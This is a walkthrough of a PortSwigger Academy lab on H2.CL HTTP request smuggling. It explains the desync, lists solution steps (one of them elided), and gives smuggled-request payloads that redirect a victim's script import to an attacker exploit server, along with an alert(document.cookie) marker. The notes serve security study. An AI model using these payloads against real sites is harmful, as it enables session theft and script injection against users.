# Lab: H2.CL request smuggling

**Official lab:** [https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

## Lab idea

This lab explores ambiguous request length during HTTP/2-to-HTTP/1 downgrading. It practices assessing how protocol translation can create a desynchronization that influences a victim browser’s handling of script content.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an HTTP/2 request by including a Content-Length: 0 header as follows.
2. Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.
3. Using Burp Repeater, notice that if you send a request for GET /resources , you are redirected to https://YOUR-LAB-ID.web-security-academy.net/resources/ .
4. Create the following request to smuggle the start of a request for /resources , along with an arbitrary Host header: POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length…
- …
6. Resend the request and wait for 10 seconds or so.
7. Go to the exploit server and check the access log.
8. Once you have confirmed that you can cause the victim to be redirected to the exploit server, repeat the attack until the lab solves.

## Payloads / key values
- `Content-Length: 0`
- `POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 SMUGGLED`
- `GET /resources`
- `https://YOUR-LAB-ID.web-security-academy.net/resources/`
- `/resources`
- `Host`
- `POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: foo Content-Length: 5 x=1`
- `alert(document.cookie)`
- `POST / HTTP/2 Host: YOUR-LAB-ID.web-security-academy.net Content-Length: 0 GET /resources HTTP/1.1 Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net Content-Length: 5 x=1`
- `GET /resources/`

## Official source
- [PortSwigger Academy: Lab: H2.CL request smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)
